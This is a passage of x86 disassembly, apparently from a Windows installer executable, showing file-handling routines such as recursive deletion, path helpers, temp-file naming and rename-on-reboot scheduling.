  40577c:	0f 84 27 01 00 00    	je     0x4058a9
  405782:	f6 c3 02             	test   $0x2,%bl
  405785:	0f 84 1e 01 00 00    	je     0x4058a9
  40578b:	be 10 0d 42 00       	mov    $0x420d10,%esi
  405790:	57                   	push   %edi
  405791:	56                   	push   %esi
  405792:	e8 d3 07 00 00       	call   0x405f6a
  405797:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40579b:	74 0d                	je     0x4057aa
  40579d:	68 ac 93 40 00       	push   $0x4093ac
  4057a2:	56                   	push   %esi
  4057a3:	e8 de 07 00 00       	call   0x405f86
  4057a8:	eb 06                	jmp    0x4057b0
  4057aa:	57                   	push   %edi
  4057ab:	e8 99 01 00 00       	call   0x405949
  4057b0:	80 3f 00             	cmpb   $0x0,(%edi)
  4057b3:	75 09                	jne    0x4057be
  4057b5:	80 3d 10 0d 42 00 5c 	cmpb   $0x5c,0x420d10
  4057bc:	75 0b                	jne    0x4057c9
  4057be:	68 14 90 40 00       	push   $0x409014
  4057c3:	57                   	push   %edi
  4057c4:	e8 bd 07 00 00       	call   0x405f86
  4057c9:	57                   	push   %edi
  4057ca:	e8 b1 07 00 00       	call   0x405f80
  4057cf:	8b d8                	mov    %eax,%ebx
  4057d1:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
  4057d7:	50                   	push   %eax
  4057d8:	56                   	push   %esi
  4057d9:	03 df                	add    %edi,%ebx
  4057db:	ff 15 28 71 40 00    	call   *0x407128
  4057e1:	83 f8 ff             	cmp    $0xffffffff,%eax
  4057e4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4057e7:	0f 84 b2 00 00 00    	je     0x40589f
  4057ed:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  4057f3:	6a 3f                	push   $0x3f
  4057f5:	50                   	push   %eax
  4057f6:	8d b5 e0 fe ff ff    	lea    -0x120(%ebp),%esi
  4057fc:	e8 2c 01 00 00       	call   0x40592d
  405801:	80 38 00             	cmpb   $0x0,(%eax)
  405804:	74 09                	je     0x40580f
  405806:	80 7d e4 00          	cmpb   $0x0,-0x1c(%ebp)
  40580a:	74 03                	je     0x40580f
  40580c:	8d 75 e4             	lea    -0x1c(%ebp),%esi
  40580f:	80 3e 2e             	cmpb   $0x2e,(%esi)
  405812:	75 11                	jne    0x405825
  405814:	8a 46 01             	mov    0x1(%esi),%al
  405817:	84 c0                	test   %al,%al
  405819:	74 63                	je     0x40587e
  40581b:	3c 2e                	cmp    $0x2e,%al
  40581d:	75 06                	jne    0x405825
  40581f:	80 7e 02 00          	cmpb   $0x0,0x2(%esi)
  405823:	74 59                	je     0x40587e
  405825:	56                   	push   %esi
  405826:	53                   	push   %ebx
  405827:	e8 3e 07 00 00       	call   0x405f6a
  40582c:	f6 85 b4 fe ff ff 10 	testb  $0x10,-0x14c(%ebp)
  405833:	74 15                	je     0x40584a
  405835:	8b 45 0c             	mov    0xc(%ebp),%eax
  405838:	83 e0 03             	and    $0x3,%eax
  40583b:	3c 03                	cmp    $0x3,%al
  40583d:	75 3f                	jne    0x40587e
  40583f:	ff 75 0c             	push   0xc(%ebp)
  405842:	57                   	push   %edi
  405843:	e8 ea fe ff ff       	call   0x405732
  405848:	eb 34                	jmp    0x40587e
  40584a:	ff 75 fc             	push   -0x4(%ebp)
  40584d:	57                   	push   %edi
  40584e:	e8 97 fe ff ff       	call   0x4056ea
  405853:	85 c0                	test   %eax,%eax
  405855:	75 1f                	jne    0x405876
  405857:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  40585a:	74 12                	je     0x40586e
  40585c:	57                   	push   %edi
  40585d:	6a f1                	push   $0xfffffff1
  40585f:	e8 2d f8 ff ff       	call   0x405091
  405864:	6a 00                	push   $0x0
  405866:	57                   	push   %edi
  405867:	e8 dd 04 00 00       	call   0x405d49
  40586c:	eb 10                	jmp    0x40587e
  40586e:	ff 05 a8 37 42 00    	incl   0x4237a8
  405874:	eb 08                	jmp    0x40587e
  405876:	57                   	push   %edi
  405877:	6a f2                	push   $0xfffffff2
  405879:	e8 13 f8 ff ff       	call   0x405091
  40587e:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
  405884:	50                   	push   %eax
  405885:	ff 75 f8             	push   -0x8(%ebp)
  405888:	ff 15 2c 71 40 00    	call   *0x40712c
  40588e:	85 c0                	test   %eax,%eax
  405890:	0f 85 57 ff ff ff    	jne    0x4057ed
  405896:	ff 75 f8             	push   -0x8(%ebp)
  405899:	ff 15 3c 71 40 00    	call   *0x40713c
  40589f:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4058a3:	74 04                	je     0x4058a9
  4058a5:	80 63 ff 00          	andb   $0x0,-0x1(%ebx)
  4058a9:	33 f6                	xor    %esi,%esi
  4058ab:	39 75 08             	cmp    %esi,0x8(%ebp)
  4058ae:	74 4b                	je     0x4058fb
  4058b0:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  4058b3:	75 08                	jne    0x4058bd
  4058b5:	ff 05 a8 37 42 00    	incl   0x4237a8
  4058bb:	eb 3e                	jmp    0x4058fb
  4058bd:	57                   	push   %edi
  4058be:	e8 aa 09 00 00       	call   0x40626d
  4058c3:	85 c0                	test   %eax,%eax
  4058c5:	74 34                	je     0x4058fb
  4058c7:	57                   	push   %edi
  4058c8:	e8 35 00 00 00       	call   0x405902
  4058cd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4058d0:	0c 01                	or     $0x1,%al
  4058d2:	50                   	push   %eax
  4058d3:	57                   	push   %edi
  4058d4:	e8 11 fe ff ff       	call   0x4056ea
  4058d9:	85 c0                	test   %eax,%eax
  4058db:	75 16                	jne    0x4058f3
  4058dd:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  4058e0:	74 d3                	je     0x4058b5
  4058e2:	57                   	push   %edi
  4058e3:	6a f1                	push   $0xfffffff1
  4058e5:	e8 a7 f7 ff ff       	call   0x405091
  4058ea:	56                   	push   %esi
  4058eb:	57                   	push   %edi
  4058ec:	e8 58 04 00 00       	call   0x405d49
  4058f1:	eb 08                	jmp    0x4058fb
  4058f3:	57                   	push   %edi
  4058f4:	6a e5                	push   $0xffffffe5
  4058f6:	e8 96 f7 ff ff       	call   0x405091
  4058fb:	5f                   	pop    %edi
  4058fc:	5e                   	pop    %esi
  4058fd:	5b                   	pop    %ebx
  4058fe:	c9                   	leave
  4058ff:	c2 08 00             	ret    $0x8
  405902:	56                   	push   %esi
  405903:	8b 74 24 08          	mov    0x8(%esp),%esi
  405907:	56                   	push   %esi
  405908:	e8 73 06 00 00       	call   0x405f80
  40590d:	03 c6                	add    %esi,%eax
  40590f:	50                   	push   %eax
  405910:	56                   	push   %esi
  405911:	ff 15 e8 71 40 00    	call   *0x4071e8
  405917:	80 38 5c             	cmpb   $0x5c,(%eax)
  40591a:	74 0b                	je     0x405927
  40591c:	68 14 90 40 00       	push   $0x409014
  405921:	56                   	push   %esi
  405922:	e8 5f 06 00 00       	call   0x405f86
  405927:	8b c6                	mov    %esi,%eax
  405929:	5e                   	pop    %esi
  40592a:	c2 04 00             	ret    $0x4
  40592d:	8b 44 24 04          	mov    0x4(%esp),%eax
  405931:	eb 0d                	jmp    0x405940
  405933:	3a 4c 24 08          	cmp    0x8(%esp),%cl
  405937:	74 0d                	je     0x405946
  405939:	50                   	push   %eax
  40593a:	ff 15 30 72 40 00    	call   *0x407230
  405940:	8a 08                	mov    (%eax),%cl
  405942:	84 c9                	test   %cl,%cl
  405944:	75 ed                	jne    0x405933
  405946:	c2 08 00             	ret    $0x8
  405949:	56                   	push   %esi
  40594a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40594e:	56                   	push   %esi
  40594f:	e8 2c 06 00 00       	call   0x405f80
  405954:	03 c6                	add    %esi,%eax
  405956:	80 38 5c             	cmpb   $0x5c,(%eax)
  405959:	74 0c                	je     0x405967
  40595b:	50                   	push   %eax
  40595c:	56                   	push   %esi
  40595d:	ff 15 e8 71 40 00    	call   *0x4071e8
  405963:	3b c6                	cmp    %esi,%eax
  405965:	77 ef                	ja     0x405956
  405967:	80 20 00             	andb   $0x0,(%eax)
  40596a:	40                   	inc    %eax
  40596b:	5e                   	pop    %esi
  40596c:	c2 04 00             	ret    $0x4
  40596f:	8b 54 24 04          	mov    0x4(%esp),%edx
  405973:	8a 0a                	mov    (%edx),%cl
  405975:	8a c1                	mov    %cl,%al
  405977:	0c 20                	or     $0x20,%al
  405979:	80 f9 5c             	cmp    $0x5c,%cl
  40597c:	75 05                	jne    0x405983
  40597e:	38 4a 01             	cmp    %cl,0x1(%edx)
  405981:	74 0e                	je     0x405991
  405983:	3c 61                	cmp    $0x61,%al
  405985:	7c 0f                	jl     0x405996
  405987:	3c 7a                	cmp    $0x7a,%al
  405989:	7f 0b                	jg     0x405996
  40598b:	80 7a 01 3a          	cmpb   $0x3a,0x1(%edx)
  40598f:	75 05                	jne    0x405996
  405991:	33 c0                	xor    %eax,%eax
  405993:	40                   	inc    %eax
  405994:	eb 02                	jmp    0x405998
  405996:	33 c0                	xor    %eax,%eax
  405998:	c2 04 00             	ret    $0x4
  40599b:	53                   	push   %ebx
  40599c:	56                   	push   %esi
  40599d:	8b 35 30 72 40 00    	mov    0x407230,%esi
  4059a3:	57                   	push   %edi
  4059a4:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4059a8:	57                   	push   %edi
  4059a9:	ff d6                	call   *%esi
  4059ab:	8b d8                	mov    %eax,%ebx
  4059ad:	53                   	push   %ebx
  4059ae:	ff d6                	call   *%esi
  4059b0:	8a 0f                	mov    (%edi),%cl
  4059b2:	84 c9                	test   %cl,%cl
  4059b4:	74 10                	je     0x4059c6
  4059b6:	80 3b 3a             	cmpb   $0x3a,(%ebx)
  4059b9:	75 0b                	jne    0x4059c6
  4059bb:	80 7b 01 5c          	cmpb   $0x5c,0x1(%ebx)
  4059bf:	75 05                	jne    0x4059c6
  4059c1:	50                   	push   %eax
  4059c2:	ff d6                	call   *%esi
  4059c4:	eb 24                	jmp    0x4059ea
  4059c6:	80 f9 5c             	cmp    $0x5c,%cl
  4059c9:	75 1d                	jne    0x4059e8
  4059cb:	38 4f 01             	cmp    %cl,0x1(%edi)
  4059ce:	75 18                	jne    0x4059e8
  4059d0:	6a 02                	push   $0x2
  4059d2:	5e                   	pop    %esi
  4059d3:	6a 5c                	push   $0x5c
  4059d5:	50                   	push   %eax
  4059d6:	4e                   	dec    %esi
  4059d7:	e8 51 ff ff ff       	call   0x40592d
  4059dc:	80 38 00             	cmpb   $0x0,(%eax)
  4059df:	74 07                	je     0x4059e8
  4059e1:	40                   	inc    %eax
  4059e2:	85 f6                	test   %esi,%esi
  4059e4:	75 ed                	jne    0x4059d3
  4059e6:	eb 02                	jmp    0x4059ea
  4059e8:	33 c0                	xor    %eax,%eax
  4059ea:	5f                   	pop    %edi
  4059eb:	5e                   	pop    %esi
  4059ec:	5b                   	pop    %ebx
  4059ed:	c2 04 00             	ret    $0x4
  4059f0:	56                   	push   %esi
  4059f1:	57                   	push   %edi
  4059f2:	ff 74 24 0c          	push   0xc(%esp)
  4059f6:	be 10 11 42 00       	mov    $0x421110,%esi
  4059fb:	56                   	push   %esi
  4059fc:	e8 69 05 00 00       	call   0x405f6a
  405a01:	56                   	push   %esi
  405a02:	e8 94 ff ff ff       	call   0x40599b
  405a07:	8b f8                	mov    %eax,%edi
  405a09:	85 ff                	test   %edi,%edi
  405a0b:	75 04                	jne    0x405a11
  405a0d:	33 c0                	xor    %eax,%eax
  405a0f:	eb 52                	jmp    0x405a63
  405a11:	57                   	push   %edi
  405a12:	e8 bd 07 00 00       	call   0x4061d4
  405a17:	f6 05 1c 37 42 00 80 	testb  $0x80,0x42371c
  405a1e:	74 0a                	je     0x405a2a
  405a20:	8a 07                	mov    (%edi),%al
  405a22:	84 c0                	test   %al,%al
  405a24:	74 e7                	je     0x405a0d
  405a26:	3c 5c                	cmp    $0x5c,%al
  405a28:	74 e3                	je     0x405a0d
  405a2a:	2b fe                	sub    %esi,%edi
  405a2c:	eb 14                	jmp    0x405a42
  405a2e:	e8 3a 08 00 00       	call   0x40626d
  405a33:	85 c0                	test   %eax,%eax
  405a35:	74 05                	je     0x405a3c
  405a37:	f6 00 10             	testb  $0x10,(%eax)
  405a3a:	74 d1                	je     0x405a0d
  405a3c:	56                   	push   %esi
  405a3d:	e8 07 ff ff ff       	call   0x405949
  405a42:	56                   	push   %esi
  405a43:	e8 38 05 00 00       	call   0x405f80
  405a48:	3b c7                	cmp    %edi,%eax
  405a4a:	56                   	push   %esi
  405a4b:	7f e1                	jg     0x405a2e
  405a4d:	e8 b0 fe ff ff       	call   0x405902
  405a52:	56                   	push   %esi
  405a53:	ff 15 fc 70 40 00    	call   *0x4070fc
  405a59:	33 c9                	xor    %ecx,%ecx
  405a5b:	83 f8 ff             	cmp    $0xffffffff,%eax
  405a5e:	0f 95 c1             	setne  %cl
  405a61:	8b c1                	mov    %ecx,%eax
  405a63:	5f                   	pop    %edi
  405a64:	5e                   	pop    %esi
  405a65:	c2 04 00             	ret    $0x4
  405a68:	55                   	push   %ebp
  405a69:	8b ec                	mov    %esp,%ebp
  405a6b:	51                   	push   %ecx
  405a6c:	53                   	push   %ebx
  405a6d:	56                   	push   %esi
  405a6e:	57                   	push   %edi
  405a6f:	8b 3d 98 70 40 00    	mov    0x407098,%edi
  405a75:	ff 75 0c             	push   0xc(%ebp)
  405a78:	ff d7                	call   *%edi
  405a7a:	8b 75 08             	mov    0x8(%ebp),%esi
  405a7d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405a80:	eb 27                	jmp    0x405aa9
  405a82:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405a85:	ff 75 0c             	push   0xc(%ebp)
  405a88:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  405a8b:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  405a8f:	56                   	push   %esi
  405a90:	ff 15 18 71 40 00    	call   *0x407118
  405a96:	85 c0                	test   %eax,%eax
  405a98:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405a9b:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  405a9e:	74 1a                	je     0x405aba
  405aa0:	56                   	push   %esi
  405aa1:	ff 15 30 72 40 00    	call   *0x407230
  405aa7:	8b f0                	mov    %eax,%esi
  405aa9:	56                   	push   %esi
  405aaa:	ff d7                	call   *%edi
  405aac:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  405aaf:	7d d1                	jge    0x405a82
  405ab1:	33 c0                	xor    %eax,%eax
  405ab3:	5f                   	pop    %edi
  405ab4:	5e                   	pop    %esi
  405ab5:	5b                   	pop    %ebx
  405ab6:	c9                   	leave
  405ab7:	c2 08 00             	ret    $0x8
  405aba:	8b c6                	mov    %esi,%eax
  405abc:	eb f5                	jmp    0x405ab3
  405abe:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405ac2:	56                   	push   %esi
  405ac3:	8b 74 24 10          	mov    0x10(%esp),%esi
  405ac7:	85 f6                	test   %esi,%esi
  405ac9:	76 0f                	jbe    0x405ada
  405acb:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405acf:	2b c1                	sub    %ecx,%eax
  405ad1:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  405ad4:	88 11                	mov    %dl,(%ecx)
  405ad6:	41                   	inc    %ecx
  405ad7:	4e                   	dec    %esi
  405ad8:	75 f7                	jne    0x405ad1
  405ada:	5e                   	pop    %esi
  405adb:	c2 0c 00             	ret    $0xc
  405ade:	56                   	push   %esi
  405adf:	ff 74 24 08          	push   0x8(%esp)
  405ae3:	ff 15 fc 70 40 00    	call   *0x4070fc
  405ae9:	8b f0                	mov    %eax,%esi
  405aeb:	83 fe ff             	cmp    $0xffffffff,%esi
  405aee:	74 0d                	je     0x405afd
  405af0:	24 fe                	and    $0xfe,%al
  405af2:	50                   	push   %eax
  405af3:	ff 74 24 0c          	push   0xc(%esp)
  405af7:	ff 15 f8 70 40 00    	call   *0x4070f8
  405afd:	8b c6                	mov    %esi,%eax
  405aff:	5e                   	pop    %esi
  405b00:	c2 04 00             	ret    $0x4
  405b03:	ff 74 24 04          	push   0x4(%esp)
  405b07:	ff 15 fc 70 40 00    	call   *0x4070fc
  405b0d:	8b c8                	mov    %eax,%ecx
  405b0f:	6a 00                	push   $0x0
  405b11:	41                   	inc    %ecx
  405b12:	f7 d9                	neg    %ecx
  405b14:	1b c9                	sbb    %ecx,%ecx
  405b16:	23 c8                	and    %eax,%ecx
  405b18:	51                   	push   %ecx
  405b19:	ff 74 24 14          	push   0x14(%esp)
  405b1d:	6a 00                	push   $0x0
  405b1f:	6a 01                	push   $0x1
  405b21:	ff 74 24 1c          	push   0x1c(%esp)
  405b25:	ff 74 24 1c          	push   0x1c(%esp)
  405b29:	ff 15 c8 70 40 00    	call   *0x4070c8
  405b2f:	c2 0c 00             	ret    $0xc
  405b32:	55                   	push   %ebp
  405b33:	8b ec                	mov    %esp,%ebp
  405b35:	56                   	push   %esi
  405b36:	8b 75 08             	mov    0x8(%ebp),%esi
  405b39:	57                   	push   %edi
  405b3a:	6a 64                	push   $0x64
  405b3c:	5f                   	pop    %edi
  405b3d:	a1 b4 93 40 00       	mov    0x4093b4,%eax
  405b42:	4f                   	dec    %edi
  405b43:	89 45 08             	mov    %eax,0x8(%ebp)
  405b46:	ff 15 90 70 40 00    	call   *0x407090
  405b4c:	6a 1a                	push   $0x1a
  405b4e:	33 d2                	xor    %edx,%edx
  405b50:	59                   	pop    %ecx
  405b51:	f7 f1                	div    %ecx
  405b53:	56                   	push   %esi
  405b54:	8d 45 08             	lea    0x8(%ebp),%eax
  405b57:	6a 00                	push   $0x0
  405b59:	50                   	push   %eax
  405b5a:	ff 75 0c             	push   0xc(%ebp)
  405b5d:	00 55 0a             	add    %dl,0xa(%ebp)
  405b60:	ff 15 cc 70 40 00    	call   *0x4070cc
  405b66:	85 c0                	test   %eax,%eax
  405b68:	75 0d                	jne    0x405b77
  405b6a:	85 ff                	test   %edi,%edi
  405b6c:	75 cf                	jne    0x405b3d
  405b6e:	80 26 00             	andb   $0x0,(%esi)
  405b71:	5f                   	pop    %edi
  405b72:	5e                   	pop    %esi
  405b73:	5d                   	pop    %ebp
  405b74:	c2 08 00             	ret    $0x8
  405b77:	8b c6                	mov    %esi,%eax
  405b79:	eb f6                	jmp    0x405b71
  405b7b:	55                   	push   %ebp
  405b7c:	8b ec                	mov    %esp,%ebp
  405b7e:	56                   	push   %esi
  405b7f:	8b 75 10             	mov    0x10(%ebp),%esi
  405b82:	8d 45 10             	lea    0x10(%ebp),%eax
  405b85:	6a 00                	push   $0x0
  405b87:	50                   	push   %eax
  405b88:	56                   	push   %esi
  405b89:	ff 75 0c             	push   0xc(%ebp)
  405b8c:	ff 75 08             	push   0x8(%ebp)
  405b8f:	ff 15 d0 70 40 00    	call   *0x4070d0
  405b95:	85 c0                	test   %eax,%eax
  405b97:	74 0a                	je     0x405ba3
  405b99:	3b 75 10             	cmp    0x10(%ebp),%esi
  405b9c:	75 05                	jne    0x405ba3
  405b9e:	33 c0                	xor    %eax,%eax
  405ba0:	40                   	inc    %eax
  405ba1:	eb 02                	jmp    0x405ba5
  405ba3:	33 c0                	xor    %eax,%eax
  405ba5:	5e                   	pop    %esi
  405ba6:	5d                   	pop    %ebp
  405ba7:	c2 0c 00             	ret    $0xc
  405baa:	55                   	push   %ebp
  405bab:	8b ec                	mov    %esp,%ebp
  405bad:	56                   	push   %esi
  405bae:	8b 75 10             	mov    0x10(%ebp),%esi
  405bb1:	8d 45 10             	lea    0x10(%ebp),%eax
  405bb4:	6a 00                	push   $0x0
  405bb6:	50                   	push   %eax
  405bb7:	56                   	push   %esi
  405bb8:	ff 75 0c             	push   0xc(%ebp)
  405bbb:	ff 75 08             	push   0x8(%ebp)
  405bbe:	ff 15 d4 70 40 00    	call   *0x4070d4
  405bc4:	85 c0                	test   %eax,%eax
  405bc6:	74 0a                	je     0x405bd2
  405bc8:	3b 75 10             	cmp    0x10(%ebp),%esi
  405bcb:	75 05                	jne    0x405bd2
  405bcd:	33 c0                	xor    %eax,%eax
  405bcf:	40                   	inc    %eax
  405bd0:	eb 02                	jmp    0x405bd4
  405bd2:	33 c0                	xor    %eax,%eax
  405bd4:	5e                   	pop    %esi
  405bd5:	5d                   	pop    %ebp
  405bd6:	c2 0c 00             	ret    $0xc
  405bd9:	53                   	push   %ebx
  405bda:	8b 1d 00 71 40 00    	mov    0x407100,%ebx
  405be0:	55                   	push   %ebp
  405be1:	56                   	push   %esi
  405be2:	8b 74 24 14          	mov    0x14(%esp),%esi
  405be6:	57                   	push   %edi
  405be7:	85 f6                	test   %esi,%esi
  405be9:	c7 05 98 1a 42 00 4e 	movl   $0x4c554e,0x421a98
  405bf0:	55 4c 00 
  405bf3:	bf 00 04 00 00       	mov    $0x400,%edi
  405bf8:	bd 98 1a 42 00       	mov    $0x421a98,%ebp
  405bfd:	74 26                	je     0x405c25
  405bff:	6a 01                	push   $0x1
  405c01:	6a 00                	push   $0x0
  405c03:	56                   	push   %esi
  405c04:	e8 fa fe ff ff       	call   0x405b03
  405c09:	50                   	push   %eax
  405c0a:	ff 15 14 71 40 00    	call   *0x407114
  405c10:	57                   	push   %edi
  405c11:	55                   	push   %ebp
  405c12:	56                   	push   %esi
  405c13:	ff d3                	call   *%ebx
  405c15:	85 c0                	test   %eax,%eax
  405c17:	0f 84 27 01 00 00    	je     0x405d44
  405c1d:	3b c7                	cmp    %edi,%eax
  405c1f:	0f 8f 1f 01 00 00    	jg     0x405d44
  405c25:	be 98 1e 42 00       	mov    $0x421e98,%esi
  405c2a:	57                   	push   %edi
  405c2b:	56                   	push   %esi
  405c2c:	ff 74 24 1c          	push   0x1c(%esp)
  405c30:	ff d3                	call   *%ebx
  405c32:	85 c0                	test   %eax,%eax
  405c34:	0f 84 0a 01 00 00    	je     0x405d44
  405c3a:	3b c7                	cmp    %edi,%eax
  405c3c:	0f 8f 02 01 00 00    	jg     0x405d44
  405c42:	56                   	push   %esi
  405c43:	55                   	push   %ebp
  405c44:	68 c8 93 40 00       	push   $0x4093c8
  405c49:	68 98 16 42 00       	push   $0x421698
  405c4e:	ff 15 74 72 40 00    	call   *0x407274
  405c54:	8b d8                	mov    %eax,%ebx
  405c56:	a1 14 37 42 00       	mov    0x423714,%eax
  405c5b:	83 c4 10             	add    $0x10,%esp
  405c5e:	ff b0 28 01 00 00    	push   0x128(%eax)
  405c64:	56                   	push   %esi
  405c65:	e8 22 03 00 00       	call   0x405f8c
  405c6a:	6a 04                	push   $0x4
  405c6c:	68 00 00 00 c0       	push   $0xc0000000
  405c71:	56                   	push   %esi
  405c72:	e8 8c fe ff ff       	call   0x405b03
  405c77:	8b e8                	mov    %eax,%ebp
  405c79:	83 fd ff             	cmp    $0xffffffff,%ebp
  405c7c:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  405c80:	0f 84 be 00 00 00    	je     0x405d44
  405c86:	6a 00                	push   $0x0
  405c88:	55                   	push   %ebp
  405c89:	ff 15 74 70 40 00    	call   *0x407074
  405c8f:	8b f8                	mov    %eax,%edi
  405c91:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  405c95:	50                   	push   %eax
  405c96:	6a 40                	push   $0x40
  405c98:	ff 15 58 71 40 00    	call   *0x407158
  405c9e:	8b f0                	mov    %eax,%esi
  405ca0:	85 f6                	test   %esi,%esi
  405ca2:	0f 84 95 00 00 00    	je     0x405d3d
  405ca8:	57                   	push   %edi
  405ca9:	56                   	push   %esi
  405caa:	55                   	push   %ebp
  405cab:	e8 cb fe ff ff       	call   0x405b7b
  405cb0:	85 c0                	test   %eax,%eax
  405cb2:	0f 84 85 00 00 00    	je     0x405d3d
  405cb8:	68 bc 93 40 00       	push   $0x4093bc
  405cbd:	56                   	push   %esi
  405cbe:	e8 a5 fd ff ff       	call   0x405a68
  405cc3:	85 c0                	test   %eax,%eax
  405cc5:	75 14                	jne    0x405cdb
  405cc7:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  405cca:	68 bc 93 40 00       	push   $0x4093bc
  405ccf:	50                   	push   %eax
  405cd0:	ff 15 d8 70 40 00    	call   *0x4070d8
  405cd6:	83 c7 0a             	add    $0xa,%edi
  405cd9:	eb 35                	jmp    0x405d10
  405cdb:	83 c0 0a             	add    $0xa,%eax
  405cde:	68 b8 93 40 00       	push   $0x4093b8
  405ce3:	50                   	push   %eax
  405ce4:	e8 7f fd ff ff       	call   0x405a68
  405ce9:	8b e8                	mov    %eax,%ebp
  405ceb:	85 ed                	test   %ebp,%ebp
  405ced:	74 1d                	je     0x405d0c
  405cef:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  405cf2:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  405cf5:	eb 06                	jmp    0x405cfd
  405cf7:	8a 11                	mov    (%ecx),%dl
  405cf9:	88 10                	mov    %dl,(%eax)
  405cfb:	48                   	dec    %eax
  405cfc:	49                   	dec    %ecx
  405cfd:	3b cd                	cmp    %ebp,%ecx
  405cff:	77 f6                	ja     0x405cf7
  405d01:	2b ee                	sub    %esi,%ebp
  405d03:	45                   	inc    %ebp
  405d04:	8b c5                	mov    %ebp,%eax
  405d06:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  405d0a:	eb 06                	jmp    0x405d12
  405d0c:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  405d10:	8b c7                	mov    %edi,%eax
  405d12:	53                   	push   %ebx
  405d13:	03 c6                	add    %esi,%eax
  405d15:	68 98 16 42 00       	push   $0x421698
  405d1a:	50                   	push   %eax
  405d1b:	e8 9e fd ff ff       	call   0x405abe
  405d20:	33 c0                	xor    %eax,%eax
  405d22:	50                   	push   %eax
  405d23:	50                   	push   %eax
  405d24:	50                   	push   %eax
  405d25:	55                   	push   %ebp
  405d26:	ff 15 34 71 40 00    	call   *0x407134
  405d2c:	03 fb                	add    %ebx,%edi
  405d2e:	57                   	push   %edi
  405d2f:	56                   	push   %esi
  405d30:	55                   	push   %ebp
  405d31:	e8 74 fe ff ff       	call   0x405baa
  405d36:	56                   	push   %esi
  405d37:	ff 15 5c 71 40 00    	call   *0x40715c
  405d3d:	55                   	push   %ebp
  405d3e:	ff 15 14 71 40 00    	call   *0x407114
  405d44:	5f                   	pop    %edi
  405d45:	5e                   	pop    %esi
  405d46:	5d                   	pop    %ebp
  405d47:	5b                   	pop    %ebx
  405d48:	c3                   	ret
  405d49:	6a 05                	push   $0x5
  405d4b:	ff 74 24 0c          	push   0xc(%esp)
  405d4f:	ff 74 24 0c          	push   0xc(%esp)
  405d53:	ff 15 dc 70 40 00    	call   *0x4070dc
  405d59:	85 c0                	test   %eax,%eax
  405d5b:	75 0f                	jne    0x405d6c
  405d5d:	ff 74 24 08          	push   0x8(%esp)
  405d61:	ff 74 24 08          	push   0x8(%esp)
  405d65:	e8 6f fe ff ff       	call   0x405bd9
  405d6a:	59                   	pop    %ecx
  405d6b:	59                   	pop    %ecx
  405d6c:	ff 05 b0 37 42 00    	incl   0x4237b0
  405d72:	c2 08 00             	ret    $0x8
  405d75:	8b 15 0c 37 42 00    	mov    0x42370c,%edx
  405d7b:	53                   	push   %ebx
  405d7c:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  405d80:	57                   	push   %edi
  405d81:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405d85:	f7 d2                	not    %edx
  405d87:	8b 07                	mov    (%edi),%eax
  405d89:	c1 ea 16             	shr    $0x16,%edx
  405d8c:	81 e2 00 01 00 00    	and    $0x100,%edx
  405d92:	a8 20                	test   $0x20,%al
  405d94:	74 34                	je     0x405dca
  405d96:	f7 c3 00 00 00 60    	test   $0x60000000,%ebx
  405d9c:	74 2c                	je     0x405dca
  405d9e:	8b cb                	mov    %ebx,%ecx
  405da0:	56                   	push   %esi
  405da1:	c1 e9 15             	shr    $0x15,%ecx
  405da4:	be 00 03 00 00       	mov    $0x300,%esi
  405da9:	23 ce                	and    %esi,%ecx
  405dab:	3b ce                	cmp    %esi,%ecx
  405dad:	5e                   	pop    %esi
  405dae:	75 0a                	jne    0x405dba
  405db0:	8b ca                	mov    %edx,%ecx
  405db2:	f7 d1                	not    %ecx
  405db4:	23 0d d0 37 42 00    	and    0x4237d0,%ecx
  405dba:	80 e4 fe             	and    $0xfe,%ah
  405dbd:	0b c1                	or     %ecx,%eax
  405dbf:	80 e4 fd             	and    $0xfd,%ah
  405dc2:	81 e3 ff ff ff 9f    	and    $0x9fffffff,%ebx
  405dc8:	eb 0d                	jmp    0x405dd7
  405dca:	a9 00 00 10 00       	test   $0x100000,%eax
  405dcf:	74 06                	je     0x405dd7
  405dd1:	0b 05 d0 37 42 00    	or     0x4237d0,%eax
  405dd7:	8b c8                	mov    %eax,%ecx
  405dd9:	23 c2                	and    %edx,%eax
  405ddb:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  405de1:	f7 d8                	neg    %eax
  405de3:	1b c0                	sbb    %eax,%eax
  405de5:	89 0f                	mov    %ecx,(%edi)
  405de7:	f7 d0                	not    %eax
  405de9:	23 c3                	and    %ebx,%eax
  405deb:	5f                   	pop    %edi
  405dec:	5b                   	pop    %ebx
  405ded:	c2 08 00             	ret    $0x8
  405df0:	55                   	push   %ebp
  405df1:	8b ec                	mov    %esp,%ebp
  405df3:	8d 45 10             	lea    0x10(%ebp),%eax
  405df6:	50                   	push   %eax
  405df7:	ff 75 08             	push   0x8(%ebp)
  405dfa:	e8 76 ff ff ff       	call   0x405d75
  405dff:	85 c0                	test   %eax,%eax
  405e01:	75 05                	jne    0x405e08
  405e03:	6a 06                	push   $0x6
  405e05:	58                   	pop    %eax
